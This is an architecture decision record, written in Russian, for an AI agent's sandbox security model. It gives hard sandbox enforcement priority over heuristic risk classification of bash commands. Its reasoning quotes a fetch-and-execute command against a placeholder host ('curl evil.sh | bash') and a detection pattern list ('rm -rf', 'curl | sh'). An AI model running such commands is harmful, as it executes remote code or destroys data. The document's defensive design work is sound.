# ADR-0002: Модель безопасности — enforcement важнее классификации

## Статус

Принято

## Контекст

Approval-механизм ТЗ опирается на классификацию действий по риску (low/medium/high/critical). Для типизированных tools (`write_file`, `git.push`) классификация тривиальна и детерминированна. Для произвольных bash-команд статическая классификация принципиально нерешаема: `curl evil.sh | bash` маскируется бесконечным числом способов, а определить «команда полезет в сеть» до исполнения невозможно в общем случае.

Если строить гарантии безопасности на распознавании опасных команд, модель безопасности будет ложной.

## Решение

Два слоя с разными ролями:

### Слой 1 — enforcement (гарантии)

Sandbox-инварианты, которые держатся независимо от того, что решил Policy Engine:

* сеть выключена по умолчанию (allowlist — явное policy-решение);
* файловая система ограничена явными mounts (workspace rw, остальное — недоступно);
* non-root user, CPU/RAM limits, timeout;
* секреты отсутствуют в окружении sandbox;
* git-credentials недоступны внутри sandbox.

Ошибка классификации на слое 2 не может нарушить инварианты слоя 1.

### Слой 2 — классификация (UX)

* типизированные tools: риск определяется детерминированно по имени tool и аргументам;
* bash: паттерн-эвристики (`rm -rf`, `curl | sh`, пути вне workspace) используются **только** чтобы решить, показывать ли approval-запрос; они никогда не ослабляют слой 1;
* MCP tools без назначенного риска: `high` + require_approval по умолчанию.

### Подсказки для жёстких границ (блок E)

Enforcement решает, что произойдёт; подсказка объясняет модели уже принятое решение и говорит, что делать вместо повтора. Она ничего не разрешает и на исход не влияет — это надстройка над слоем 1, а не его часть.

* **Область — четыре класса отказов**, повтор которых заведомо бесполезен: выход за пределы workspace, запись в управляющий каталог (`.git`, `.svarog`), запрет политикой, отказ или истечение approval. Обычные ошибки tool сюда не входят: там повтор с другими аргументами осмыслен, и подсказка была бы шумом.
* **Класс определяется типизированно в момент отказа** (`BoundaryKind` в `tools/guidance.py`), а не распознаванием текста ошибки при рендере: распознавание было бы ровно той классификацией, против которой стоит этот ADR, и ломалось бы от любой правки формулировки.
* **Текст подставляется при рендере результата для модели** (`_render_tool_result`) и **не попадает в trace**: аудит хранит чистую причину отказа, без повторяющегося текста-инструкции.
* Подсказка повторяется на каждом отказе — она нужна ровно в тот момент, когда модель собирается повторить бесполезное действие. Детектор затухающей отдачи (ADR-0015 §1.6) остаётся backstop'ом и не меняется.

Файлы: `tools/guidance.py`, `tools/base.py` (`ToolError.kind`, `ToolResult.boundary`), `tools/file_tools.py`, `runtime/loop.py`. Reproducer'ы: `tests/test_guidance.py`, `tests/test_file_tools.py`, `tests/test_loop.py`, `tests/test_approval_flow.py`.

### Привилегированные операции

Операции, требующие credentials или доступа к host (git push, чтение секретов, управление сервисами), выполняет привилегированный host-компонент runtime **вне sandbox**, по явному policy-решению с approval. Sandbox никогда не получает credentials «на всякий случай».

## Последствия

* Честная модель безопасности: документация может утверждать гарантии слоя 1 и только best-effort для слоя 2.
* Approval fatigue снижается: безопасные команды в закрытом sandbox не требуют подтверждений.
* Yolo-first модель автономии (ADR-0010) опирается на слой 1 плюс обратимость Git-действий: approval остается только для типизированного critical-набора, который не зависит от эвристик слоя 2.
* Требуется точная модель mounts для каждого run (workspace, skills read-only, память недоступна напрямую).
* Local trusted mode (без sandbox) явно документируется как режим без гарантий слоя 1.
